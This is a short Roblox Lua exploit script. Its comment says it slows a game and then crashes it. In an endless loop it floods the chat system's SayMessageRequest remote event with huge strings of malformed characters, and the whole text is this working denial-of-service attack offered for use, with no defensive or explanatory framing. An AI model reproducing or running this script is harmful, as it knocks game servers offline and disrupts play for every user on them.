-- Takes time to begin Crashing (Slows down the game then crashes)
 
local remote = game:GetService'ReplicatedStorage'.DefaultChatSystemChatEvents:WaitForChild'SayMessageRequest'
while wait() do
    local malformed = string.rep("à¸à¹à¹à¹ââ", math.random(10000, 2e5))
    remote:FireServer(malformed, malformed)
end